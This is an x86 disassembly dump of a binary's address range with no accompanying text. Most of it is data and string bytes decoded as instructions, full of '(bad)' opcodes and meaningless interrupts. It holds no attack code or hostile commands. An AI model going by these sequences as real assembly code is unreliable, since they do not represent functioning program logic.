  4279e9:	out    dx,eax
  4279ea:	xchg   edx,eax
  4279eb:	adc    bh,al
  4279ed:	add    BYTE PTR [eax-0x2aac9380],0x53
  4279f4:	clc    
  4279f5:	ds xchg esi,eax
  4279f7:	xor    BYTE PTR [esi],bl
  4279f9:	(bad)  
  4279fa:	adc    al,0xcd
  4279fc:	xchg   esi,eax
  4279fd:	cmp    al,0xcd
  4279ff:	(bad)  
  427a00:	inc    esp
  427a01:	int    0x96
  427a03:	xor    ch,cl
  427a05:	(bad)  
  427a06:	adc    al,0xcd
  427a08:	xchg   esi,eax
  427a09:	xor    ch,cl
  427a0b:	(bad)  
  427a0c:	adc    al,0xcd
  427a0e:	out    0x30,al
  427a10:	int    0xa6
  427a12:	adc    al,0x3b
  427a14:	adc    DWORD PTR [ebx],edi
  427a16:	jecxz  0x427a47
  427a18:	inc    ebp
  427a19:	sti    
  427a1a:	xchg   edx,eax
  427a1b:	shr    ecx,cl
  427a1d:	sub    BYTE PTR [ebx],bh
  427a1f:	fst    QWORD PTR [edx]
  427a21:	clc    
  427a22:	add    BYTE PTR [eax-0x102c9380],0x92
  427a29:	push   ebx
  427a2a:	clc    
  427a2b:	int    0xe6
  427a2d:	cmp    al,0x53
  427a2f:	aad    0xcd
  427a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a32:	inc    esp
  427a33:	cmp    edi,edx
  427a35:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a3b:	lea    eax,[edi+ebp*1+0x45]
  427a3f:	loope  0x4279d3
  427a41:	cmp    ecx,ebx
  427a43:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a49:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a4e:	lea    esi,[eax]
  427a50:	shr    esp,cl
  427a52:	xchg   edx,eax
  427a53:	push   ebx
  427a54:	popf   
  427a55:	xchg   ecx,ebx
  427a57:	int    0x96
  427a59:	adc    al,0x1b
  427a5b:	hlt    
  427a5c:	add    al,0xf2
  427a5e:	std    
  427a5f:	shr    edi,cl
  427a61:	sub    BYTE PTR [ebx],bh
  427a63:	ins    DWORD PTR es:[edi],dx
  427a64:	adc    al,BYTE PTR [edx]
  427a66:	aam    0x37
  427a68:	ficom  WORD PTR [ebx]
  427a6a:	adc    bh,bl
  427a6c:	mov    ebp,0xcd25230a
  427a71:	out    0x3c,al
  427a73:	int    0xa6
  427a75:	inc    esp
  427a76:	add    al,0xe9
  427a78:	std    
  427a79:	adc    bh,al
  427a7b:	aam    0x37
  427a7d:	ficom  WORD PTR [ebx]
  427a7f:	adc    dh,ah
  427a81:	mov    ebp,0x8725230a
  427a86:	lock int 0xe6
  427a89:	and    al,0x1b
  427a8b:	aad    0x53
  427a8d:	rcl    BYTE PTR [esi-0x43],cl
  427a90:	or     ah,BYTE PTR [ebx]
  427a92:	and    eax,0x12025370
  427a97:	not    esi
  427a99:	aaa    
  427a9a:	ficom  WORD PTR [ebx]
  427a9c:	cwde   
  427a9d:	add    dh,dl
  427a9f:	xor    al,0x0
  427aa1:	(bad)  
  427aa2:	sub    al,0x9a
  427aa4:	add    dh,dl
  427aa6:	sbb    al,0x0
  427aa8:	(bad)  
  427aa9:	adc    al,0x0
  427aab:	(bad)  
  427aac:	xor    BYTE PTR [eax],al
  427aae:	(bad)  
  427aaf:	dec    esp
  427ab0:	add    dh,dl
  427ab2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ab8:	or     cl,BYTE PTR [ebx-0x57557433]
  427abe:	arpl   bx,cx
  427ac0:	sar    BYTE PTR [eax+eax*4],cl
  427ac3:	int    0x96
  427ac5:	mov    ch,cl
  427ac7:	(bad)  
  427ac8:	dec    esp
  427ac9:	int    0xe6
  427acb:	mov    ch,cl
  427acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ace:	dec    esp
  427acf:	cmp    esp,ebx
  427ad1:	cmp    edx,DWORD PTR [ecx]
  427ad3:	das    
  427ad4:	inc    ebp
  427ad5:	sti    
  427ad6:	xchg   edx,eax
  427ad7:	shr    ecx,cl
  427ad9:	sub    BYTE PTR [edx],dl
  427adb:	clc    
  427adc:	add    BYTE PTR [eax-0x102c9380],0x92
  427ae3:	cmp    ebx,ebp
  427ae5:	push   ebx
  427ae6:	aad    0x53
  427ae8:	clc    
  427ae9:	int    0xe6
  427aeb:	xor    ch,cl
  427aed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aee:	adc    al,0x53
  427af0:	fst    DWORD PTR [ebx-0xc]
  427af3:	or     dl,BYTE PTR [esi+0x14d60a30]
  427af9:	int    0x96
  427afb:	cmp    al,0xcd
  427afd:	(bad)  
  427afe:	inc    esp
  427aff:	int    0x96
  427b01:	xor    ch,cl
  427b03:	(bad)  
  427b04:	adc    al,0xcd
  427b06:	xchg   esi,eax
  427b07:	mov    ch,cl
  427b09:	(bad)  
  427b0a:	dec    esp
  427b0b:	int    0x96
  427b0d:	mov    ch,cl
  427b0f:	(bad)  
  427b10:	dec    esp
  427b11:	int    0xe6
  427b13:	mov    ch,cl
  427b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b16:	dec    esp
  427b17:	cmp    esp,ebx
  427b19:	cmp    edx,DWORD PTR [ecx]
  427b1b:	das    
  427b1c:	inc    ebp
  427b1d:	sti    
  427b1e:	xchg   edx,eax
  427b1f:	shr    ecx,cl
  427b21:	sub    BYTE PTR [edx],dl
  427b23:	clc    
  427b24:	add    BYTE PTR [eax-0x22c49380],0x53
  427b2b:	aad    0xd3
  427b2d:	out    dx,eax
  427b2e:	xchg   edx,eax
  427b2f:	push   ebx
  427b30:	clc    
  427b31:	int    0xe6
  427b33:	xor    ch,cl
  427b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b36:	adc    al,0x3b
  427b38:	cli    
  427b39:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b3f:	lea    edx,[edi+ebp*1]
  427b42:	inc    ebp
  427b43:	loope  0x427ad7
  427b45:	cmp    ecx,ebx
  427b47:	push   ebx
  427b48:	cli    
  427b49:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b4f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b54:	push   ebx
  427b55:	popf   
  427b56:	int    0x76
  427b58:	cmp    al,0xcd
  427b5a:	lea    eax,[edi+eax*4-0x27]
  427b5e:	int    0xe6
  427b60:	cmp    al,0x1b
  427b62:	hlt    
  427b63:	int    0xa6
  427b65:	inc    esp
  427b66:	adc    al,BYTE PTR [edx]
  427b68:	mov    ebp,0x5625230a
  427b6d:	jnp    0x427ba6
  427b6f:	ficom  WORD PTR [ebx]
  427b71:	das    
  427b72:	inc    ebp
  427b73:	jge    0x427b07
  427b75:	shr    ecx,cl
  427b77:	sub    bl,dl
  427b79:	jmp    0x427b0d
  427b7b:	cmp    ebx,ebp
  427b7d:	adc    bh,al
  427b7f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b86:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b8c:	lea    ecx,[eax-0x32b36933]
  427b92:	out    0x30,al
  427b94:	int    0xa6
  427b96:	adc    al,0x4
  427b98:	repnz std 
  427b9a:	add    al,0xe9
  427b9c:	std    
  427b9d:	adc    al,BYTE PTR [edx]
  427b9f:	aam    0x37
  427ba1:	ficom  WORD PTR [ebx]
  427ba3:	adc    bh,al
  427ba5:	aam    0x37
  427ba7:	ficom  WORD PTR [ebx]
  427ba9:	shr    edi,cl
  427bab:	sub    BYTE PTR [ebx],bh
  427bad:	ins    DWORD PTR es:[edi],dx
  427bae:	adc    bh,bl
  427bb0:	mov    ebp,0x1225230a
  427bb5:	hlt    
  427bb6:	mov    ebp,0x8725230a
  427bbb:	lock sbb edx,ebp
  427bbe:	jmp    0x427c07
  427bc0:	inc    DWORD PTR [eax]
  427bc2:	add    BYTE PTR [esi-0x12fb1233],dl
  427bc8:	sbb    al,0x98
  427bca:	pop    edi
  427bcb:	(bad)  
  427bcc:	aaa    
  427bcd:	ficom  WORD PTR [ebx]
  427bcf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bd5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bdb:	jbe    0x427b9a
  427bdd:	xchg   ecx,eax
  427bde:	aaa    
  427bdf:	ficom  WORD PTR [ebx]
  427be1:	or     dh,BYTE PTR [esi-0x13]
  427be4:	int    0x96
  427be6:	adc    ebp,ecx
  427be8:	(bad)  
  427be9:	cmc    
  427bea:	call   0xefd3:0x92fb452f
  427bf1:	xchg   edx,eax
  427bf2:	int    0xd6
  427bf4:	adc    ebp,ecx
  427bf6:	out    0xf5,al
  427bf8:	jo     0x427c0c
  427bfa:	sti    
  427bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bfc:	mov    esi,0x3b4229
  427c01:	jno    0x427c56
  427c03:	(bad)  [edx]
  427c05:	xchg   esi,eax
  427c06:	std    
  427c07:	int    0x96
  427c09:	dec    esp
  427c0a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c10:	iret   
  427c11:	jbe    0x427c10
  427c13:	add    dh,dl
  427c15:	mov    bl,dl
  427c17:	mov    ecx,0xd6007028
  427c1c:	dec    esp
  427c1d:	add    dh,dl
  427c1f:	in     eax,dx
  427c20:	add    dh,dl
  427c22:	mov    ebp,0xf5d600
  427c27:	(bad)  
  427c28:	adc    DWORD PTR [ebp+0xfde6],edi
  427c2e:	stos   BYTE PTR es:[edi],al
  427c2f:	or     dh,BYTE PTR [esi-0x3]
  427c32:	int    0x76
  427c34:	std    
  427c35:	test   al,0xcb
  427c37:	ror    BYTE PTR [eax-0x12326980],cl
  427c3d:	add    al,0xb5
  427c3f:	stc    
  427c40:	add    al,0xed
  427c42:	inc    esp
  427c43:	cwde   
  427c44:	leave  
  427c45:	je     0x427c7b
  427c47:	xor    al,0x80
  427c49:	add    BYTE PTR [eax+0x3474c980],0x44
  427c50:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c57:	xor    BYTE PTR [eax+0x0],dh
  427c5a:	(bad)  
  427c5b:	xor    al,0x0
  427c5d:	(bad)  
  427c5e:	sub    al,0x0
  427c60:	(bad)  
  427c61:	and    al,0x0
  427c63:	(bad)  
  427c64:	sbb    al,0x0
  427c66:	(bad)  
  427c67:	adc    al,0x0
  427c69:	(bad)  
  427c6a:	xor    BYTE PTR [eax],al
  427c6c:	(bad)  
  427c6d:	dec    esp
  427c6e:	add    dh,dl
  427c70:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c76:	int    0x76
  427c78:	mov    BYTE PTR [edx],cl
  427c7a:	je     0x427cb0
  427c7c:	test   ch,cl
  427c7e:	je     0x427cb4
  427c80:	xor    al,0x6
  427c82:	ins    DWORD PTR es:[edi],dx
  427c83:	das    
  427c84:	add    eax,0x80808017
  427c89:	int    0x74
  427c8b:	xor    al,0x44
  427c8d:	push   es
  427c8e:	ins    DWORD PTR es:[edi],dx
  427c8f:	das    
  427c90:	add    eax,0x8080800a
  427c95:	add    ah,dl
  427c97:	xor    al,0x24
  427c99:	add    ah,dl
  427c9b:	xor    al,0x24
  427c9d:	add    ah,dl
  427c9f:	xor    al,0x24
  427ca1:	int    0x74
  427ca3:	xor    al,0x50
  427ca5:	add    cl,dh
  427ca7:	int    0x74
  427ca9:	xor    al,0x84
  427cab:	int    0x74
  427cad:	xor    al,0x84
  427caf:	int    0x74
  427cb1:	xor    al,0x84
  427cb3:	iret   
  427cb4:	jbe    0x427c3a
  427cb6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cba:	int    0x74
  427cbc:	xor    al,0x3c
  427cbe:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427cc2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427cc6:	int    0x74
  427cc8:	xor    al,0x84
  427cca:	int    0x74
  427ccc:	xor    al,0x84
  427cce:	int    0x8c
  427cd0:	xor    al,0x84
  427cd2:	int    0xa
  427cd4:	and    eax,0xcd808081
  427cd9:	xor    ebp,ecx
  427cdb:	aam    0x34
  427cdd:	mov    ch,cl
  427cdf:	add    DWORD PTR ds:0x5e808081,ebp
  427ce5:	sbb    BYTE PTR [edi],ch
  427ce7:	or     edx,DWORD PTR ds:0xcd808081
  427ced:	xor    ch,cl
  427cef:	push   eax
  427cf0:	int    0x62
  427cf2:	fs iret 
  427cf4:	xchg   esp,eax
  427cf5:	sbb    BYTE PTR [eax-0x33],dh
  427cf8:	push   ecx
  427cf9:	int    0x22
  427cfb:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d01:	pop    esi
  427d02:	sbb    BYTE PTR [edi],ch
  427d04:	add    al,0x7b
  427d06:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d10:	dec    edx
  427d11:	int    0x80
  427d13:	xor    ecx,DWORD PTR [edi]
  427d15:	xchg   ebx,edx
  427d17:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d1d:	or     ch,0x74
  427d20:	xor    al,0x44
  427d22:	push   es
  427d23:	ins    DWORD PTR es:[edi],dx
  427d24:	das    
  427d25:	push   es
  427d26:	cwde   
  427d27:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d31:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d3b:	je     0x427d71
  427d3d:	test   ch,cl
  427d3f:	add    DWORD PTR ds:0xcd808081,esp
  427d45:	or     BYTE PTR [edx],0x74
  427d48:	xor    al,0x4c
  427d4a:	int    0x74
  427d4c:	xor    al,0x84
  427d4e:	int    0x1
  427d50:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d56:	int    0x80
  427d58:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d5c:	int    0x74
  427d5e:	xor    al,0x84
  427d60:	int    0x1
  427d62:	int3   
  427d63:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d6d:	dec    esp
  427d6e:	int    0x74
  427d70:	xor    al,0x84
  427d72:	int    0x8c
  427d74:	xor    al,0x84
  427d76:	int    0x1
  427d78:	popf   
  427d79:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d83:	or     ch,0x89
  427d86:	imul   edx,ecx,0x3b358621
  427d8c:	jns    0x427d92
  427d8e:	add    bh,bh
  427d90:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427d96:	push   ebx
  427d97:	jge    0x427da3
  427d99:	mov    WORD PTR [esp+ecx*2],?
  427d9c:	leave  
  427d9d:	je     0x427dd3
  427d9f:	mov    BYTE PTR [eax-0x327f7f80],al
  427da5:	je     0x427ddb
  427da7:	xor    al,0x6
  427da9:	ins    DWORD PTR es:[edi],dx
  427daa:	aam    0x73
  427dac:	int    0x74
  427dae:	xor    al,0x30
  427db0:	add    al,0xbd
  427db2:	adc    ah,0x52
  427db5:	jl     0x427d8b
  427db7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427dbb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427dbf:	add    ah,dl
  427dc1:	xor    al,0x2c
  427dc3:	add    ah,dl
  427dc5:	xor    al,0x2c
  427dc7:	add    ah,dl
  427dc9:	xor    al,0x2c
  427dcb:	add    ah,dl
  427dcd:	xor    al,0x2c
  427dcf:	int    0x74
  427dd1:	xor    al,0x54
  427dd3:	add    cl,dh
  427dd5:	in     al,dx
  427dd6:	cmp    BYTE PTR [eax],al
  427dd8:	aam    0x34
  427dda:	and    al,0x0
  427ddc:	aam    0x34
  427dde:	and    al,0x0
  427de0:	aam    0x34
  427de2:	and    al,0xcd
  427de4:	je     0x427e1a
  427de6:	push   eax
  427de7:	add    cl,dh
  427de9:	in     al,dx
  427dea:	and    al,BYTE PTR [eax]
  427dec:	aam    0x34
  427dee:	adc    al,0xcd
  427df0:	je     0x427e26
  427df2:	cmp    al,0x0
  427df4:	icebp  
  427df5:	in     al,dx
  427df6:	xchg   ch,cl
  427df8:	je     0x427e2e
  427dfa:	xor    al,0x0
  427dfc:	icebp  
  427dfd:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e01:	int    0x74
  427e03:	xor    al,0x4c
  427e05:	push   es
  427e06:	ins    DWORD PTR es:[edi],dx
  427e07:	aam    0x4e
  427e09:	int    0x74
  427e0b:	xor    al,0x84
  427e0d:	leave  
  427e0e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e14:	and    DWORD PTR [esi+0x3474cd35],eax
  427e1a:	mov    ch,cl
  427e1c:	mov    WORD PTR [esp+eax*4],?
  427e1f:	int    0xa
  427e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e22:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e2c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e32:	mov    ch,cl
  427e34:	mov    WORD PTR [eax+ecx*4],?
  427e37:	cmp    edi,DWORD PTR [ecx+0x4]
  427e3a:	add    bh,bh
  427e3c:	shl    edx,cl
  427e3e:	sub    bl,dl
  427e40:	mov    ebp,0xcdd35392
  427e45:	mov    WORD PTR [esp+ecx*2],?
  427e48:	inc    ebx
  427e49:	rcl    esi,cl
  427e4b:	and    ecx,ebp
  427e4d:	je     0x427e83
  427e4f:	test   ch,cl
  427e51:	mov    WORD PTR [esp+eax*4],?
  427e54:	int    0xa
  427e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e57:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e61:	add    BYTE PTR [eax],0x70
  427e64:	cmp    al,0xec
  427e66:	push   ds
  427e67:	iret   
  427e68:	jbe    0x427dee
  427e6a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e6e:	int    0x74
  427e70:	xor    al,0x4c
  427e72:	int    0x8c
  427e74:	xor    al,0x84
  427e76:	int    0xa
  427e78:	in     al,0x81
  427e7a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e81:	je     0x427eb7
  427e83:	test   ch,cl
  427e85:	add    ebp,ebp
  427e87:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427e91:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427e97:	or     bh,0x84
  427e9a:	adc    cl,ch
  427e9c:	mov    WORD PTR [esp+eax*4],?
  427e9f:	int    0xa
  427ea1:	in     al,0x81
  427ea3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eaa:	mov    BYTE PTR [eax-0x2d591833],ch
  427eb0:	sub    al,0x80
  427eb2:	lds    edx,FWORD PTR [eax+0x75]
  427eb5:	ins    BYTE PTR es:[edi],dx
  427eb6:	jae    0x427f2f
  427eb8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427ebc:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ec0:	add    BYTE PTR [ecx+0x74],ah
  427ec3:	ins    BYTE PTR es:[edi],dx
  427ec4:	popa   
  427ec5:	inc    esp
  427ec6:	gs popa 
  427ec8:	fs push 0x6561686d
  427ece:	add    BYTE PTR fs:[ebp+0x74],ah
  427ed2:	push   0x65726143
  427ed7:	outs   dx,DWORD PTR ds:[esi]
  427ed8:	jns    0x427f40
  427eda:	add    BYTE PTR gs:[edi+0x72],dh
  427ede:	jns    0x427f4d
  427ee0:	popa   
  427ee1:	outs   dx,DWORD PTR ds:[esi]
  427ee2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ee6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427eea:	push   0x6f6d6568
  427eef:	add    BYTE PTR fs:[edx+0x65],dl
  427ef3:	arpl   WORD PTR [ebx+0x62],si
  427ef6:	popa   
  427ef7:	ins    BYTE PTR es:[edi],dx
  427ef8:	jne    0x427f72
  427efa:	gs jae 0x427efd
  427efd:	ins    DWORD PTR es:[edi],dx
  427efe:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f05:	outs   dx,DWORD PTR ds:[esi]
  427f06:	jb     0x427f77
  427f08:	jo     0x427f0a
  427f0a:	ja     0x427f6d
  427f0c:	gs je  0x427f7e
  427f0f:	jb     0x427f80
  427f11:	bound  esp,QWORD PTR [ecx+0x70]
  427f14:	add    BYTE PTR [ebx+0x69],cl
  427f17:	outs   dx,BYTE PTR ds:[esi]
  427f18:	addr16 addr16 popa 
  427f1b:	outs   dx,BYTE PTR ds:[esi]
  427f1c:	arpl   WORD PTR [ecx+0x70],sp
  427f1f:	add    BYTE PTR [edi+0x6e],al
  427f22:	jne    0x427f97
  427f24:	je     0x427f8b
  427f26:	outs   dx,BYTE PTR ds:[esi]
  427f27:	push   esi
  427f28:	popa   
  427f29:	jb     0x427fa4
  427f2b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f2f:	jb     0x427f81
  427f31:	popa   
  427f32:	ins    BYTE PTR es:[edi],dx
  427f33:	ins    DWORD PTR es:[edi],dx
  427f34:	je     0x427f9f
  427f36:	outs   dx,DWORD PTR ds:[esi]
  427f37:	ja     0x427f9e
  427f39:	jb     0x427f3b
  427f3b:	jo     0x427fa2
  427f3d:	ins    DWORD PTR es:[edi],dx
  427f3e:	jns    0x427fb4
  427f40:	push   0x6f656562
  427f45:	outs   dx,BYTE PTR ds:[esi]
  427f46:	push   eax
  427f47:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f4e:	inc    ebx
  427f4f:	outs   dx,DWORD PTR ds:[esi]
  427f50:	popa   
  427f51:	ins    BYTE PTR es:[edi],dx
  427f52:	popa   
  427f53:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f5a:	je     0x427fd5
  427f5c:	outs   dx,DWORD PTR gs:[esi]
  427f5e:	outs   dx,BYTE PTR ds:[esi]
  427f5f:	gs ins BYTE PTR es:[edi],dx
  427f61:	inc    ebx
  427f62:	push   0x54007261
  427f67:	jns    0x427fd9
  427f69:	jns    0x427fd8
  427f6b:	jne    0x427fd2
  427f6d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f71:	outs   dx,DWORD PTR ds:[esi]
  427f72:	je     0x427fb6
  427f74:	gs gs jb 0x427fe8
  427f78:	outs   dx,DWORD PTR ds:[esi]
  427f79:	je     0x427fe6
  427f7b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f81:	jo     0x427fec
  427f83:	popa   
  427f84:	ins    BYTE PTR es:[edi],dx
  427f85:	dec    ebx
  427f86:	outs   dx,BYTE PTR ds:[esi]
  427f87:	popa   
  427f88:	jo     0x428003
  427f8a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f8e:	je     0x427fd2
  427f90:	gs ins BYTE PTR es:[edi],dx
  427f92:	jae    0x428003
  427f94:	js     0x427f96
  427f96:	popa   
  427f97:	data16 je 0x427fe0
  427f9a:	ins    BYTE PTR es:[edi],dx
  427f9b:	popa   
  427f9c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fa0:	gs jae 0x428004
  427fa3:	jb     0x427fa5
  427fa5:	inc    edx
  427fa6:	ins    BYTE PTR es:[edi],dx
  427fa7:	popa   
  427fa8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fac:	je     0x428014
  427fae:	ins    BYTE PTR es:[edi],dx
  427faf:	jns    0x428026
  427fb1:	push   0x6d6d6800
  427fb6:	popa   
  427fb7:	inc    edi
  427fb8:	popa   
  427fb9:	ins    BYTE PTR es:[edi],dx
  427fba:	ins    BYTE PTR es:[edi],dx
  427fbb:	push   0x48007361
  427fc0:	outs   dx,DWORD PTR ds:[esi]
  427fc1:	ins    DWORD PTR es:[edi],dx
  427fc2:	outs   dx,DWORD PTR gs:[esi]
  427fc4:	jb     0x42802b
  427fc6:	data16 jno 0x428032
  427fc9:	jae    0x42802c
  427fcb:	bound  esi,QWORD PTR [eax+0x61]
  427fce:	add    BYTE PTR [ebp+0x74],ah
  427fd1:	outs   dx,BYTE PTR ds:[esi]
  427fd2:	gs addr16 jbe 0x428037
  427fd6:	je     0x428051
  427fd8:	gs popa 
  427fda:	add    BYTE PTR [ebp+0x67],ah
  427fdd:	outs   dx,DWORD PTR ds:[esi]
  427fde:	inc    edi
  427fdf:	popa   
  427fe0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427fe8:	jo     0x42804f
  427fea:	fs jbe 0x42804e
  427fed:	je     0x428064
  427fef:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  427ff3:	outs   dx,DWORD PTR ds:[esi]
  427ff4:	add    BYTE PTR [edx+0x0],ch
  427ff7:	jne    0x427ff9
  427ff9:	add    BYTE PTR [bp+0x0],ch
  427ffd:	popa   
  427ffe:	add    BYTE PTR [esi+0x0],ch
  428001:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428006:	add    BYTE PTR [ebp+0x0],dh
  428009:	ins    DWORD PTR es:[edi],dx
  42800a:	add    BYTE PTR [eax],al
  42800c:	add    BYTE PTR [edi+0x0],ch
  42800f:	jb     0x428011
  428011:	ja     0x428013
  428013:	imul   eax,DWORD PTR [eax],0x680073
  428019:	outs   dx,BYTE PTR ds:[esi]
  42801a:	add    BYTE PTR [ecx+0x0],ch
  42801d:	add    BYTE PTR fs:[ecx+0x0],ch
  428021:	ja     0x428023
  428023:	imul   eax,DWORD PTR [eax],0x65006e
  428029:	push   0x70000000
  42802e:	add    BYTE PTR [ecx+0x0],ah
  428031:	je     0x428033
  428033:	jbe    0x428035
  428035:	add    BYTE PTR gs:[ebp+0x0],ah
  428039:	je     0x42803b
  42803b:	add    BYTE PTR gs:[edi+0x0],ah
  42803f:	ins    BYTE PTR es:[edi],dx
  428040:	add    BYTE PTR [ecx+0x0],ah
  428043:	imul   eax,DWORD PTR [eax],0x66
  428049:	outs   dx,DWORD PTR ds:[esi]
  42804a:	add    BYTE PTR [esi+0x0],ch
  42804d:	je     0x42804f
  42804f:	popa   
  428050:	add    BYTE PTR [edi+0x0],dh
  428053:	push   ebx
  428054:	add    BYTE PTR [edi+0x0],ch
  428057:	arpl   WORD PTR [eax],ax
  428059:	imul   eax,DWORD PTR [eax],0x61
  42805c:	add    BYTE PTR [esi+0x0],dh
  42805f:	outs   dx,DWORD PTR ds:[esi]
  428060:	add    BYTE PTR [eax],al
  428062:	add    BYTE PTR [ebp+0x0],ch
  428065:	jns    0x428067
  428067:	add    BYTE PTR gs:[esi+0x0],ah
  42806b:	ins    BYTE PTR es:[edi],dx
  42806c:	add    BYTE PTR [ecx+0x0],ah
  42806f:	jns    0x428071
  428071:	jbe    0x428073
  428073:	popa   
  428074:	add    BYTE PTR [esi+0x0],ch
  428077:	popa   
  428078:	add    BYTE PTR [edi+0x0],ah
  42807b:	outs   dx,DWORD PTR ds:[esi]
  42807c:	add    BYTE PTR [eax],al
  42807e:	add    BYTE PTR [edi+0x0],ch
  428081:	jb     0x428083
  428083:	jae    0x428085
  428085:	imul   eax,DWORD PTR [eax],0x47006e
  42808b:	imul   eax,DWORD PTR [eax],0x70006d
  428091:	bound  eax,QWORD PTR [eax]
  428093:	outs   dx,DWORD PTR ds:[esi]
  428094:	add    BYTE PTR [eax+0x0],dh
  428097:	imul   eax,DWORD PTR [eax],0x650000
  42809d:	js     0x42809f
  42809f:	jae    0x4280a1
  4280a1:	outs   dx,DWORD PTR ds:[esi]
  4280a2:	add    BYTE PTR [ebx+0x0],dh
  4280a5:	popa   
  4280a6:	add    BYTE PTR [esi+0x0],ch
  4280a9:	je     0x4280ab
  4280ab:	add    BYTE PTR [eax],al
  4280ad:	bound  eax,QWORD PTR [eax]
  4280af:	jns    0x4280b1
  4280b1:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  4280b6:	add    BYTE PTR [eax+eax*1+0x74],ah
  4280ba:	add    BYTE PTR [ecx+0x0],ah
  4280bd:	add    BYTE PTR [eax],al
  4280bf:	js     0x4280c1
  4280c1:	imul   eax,DWORD PTR [eax],0x610054
  4280c7:	imul   eax,DWORD PTR [eax],0x48006e
  4280cd:	popa   
  4280ce:	add    BYTE PTR [esi+0x0],ch
  4280d1:	add    BYTE PTR fs:[eax],al
  4280d4:	add    BYTE PTR [edi+0x0],cl
  4280d7:	ja     0x4280d9
  4280d9:	ins    BYTE PTR es:[edi],dx
  4280da:	add    BYTE PTR [ebx+0x0],dh
  4280dd:	popa   
  4280de:	add    BYTE PTR [ebx+0x0],dh
  4280e1:	jo     0x4280e3
  4280e3:	popa   
  4280e4:	add    BYTE PTR [ecx+0x0],ch
  4280e7:	imul   eax,DWORD PTR [eax],0x72
  4280ea:	add    BYTE PTR [ebp+0x0],ah
  4280ed:	jbe    0x4280ef
  4280ef:	add    BYTE PTR [eax],al
  4280f1:	jb     0x4280f3
  4280f3:	jne    0x4280f5
  4280f5:	je     0x4280f7
  4280f7:	ins    DWORD PTR es:[edi],dx
  4280f8:	add    BYTE PTR [ebp+0x0],dh
  4280fb:	arpl   WORD PTR [eax],ax
  4280fd:	jne    0x4280ff
  4280ff:	jo     0x428101
  428101:	add    BYTE PTR [eax],al
  428103:	jae    0x428105
  428105:	outs   dx,DWORD PTR ds:[esi]
  428106:	add    BYTE PTR [esi+0x0],ah
  428109:	imul   eax,DWORD PTR [eax],0x630062
  42810f:	outs   dx,DWORD PTR ds:[esi]
  428110:	add    BYTE PTR [ecx+0x0],ch
  428113:	jb     0x428115
  428115:	jae    0x428117
  428117:	outs   dx,DWORD PTR ds:[esi]
  428118:	add    BYTE PTR [eax],al
  42811a:	add    BYTE PTR [ebx+0x0],dl
  42811d:	outs   dx,DWORD PTR ds:[esi]
  42811e:	add    BYTE PTR [ebx+0x0],ah
  428121:	popa   
  428122:	add    BYTE PTR [ecx+0x0],ch
  428125:	jae    0x428127
  428127:	data16 add BYTE PTR [ecx+0x0],ah
  42812b:	jb     0x42812d
  42812d:	popa   
  42812e:	add    BYTE PTR [ecx+0x0],ch
  428131:	add    BYTE PTR [eax],al
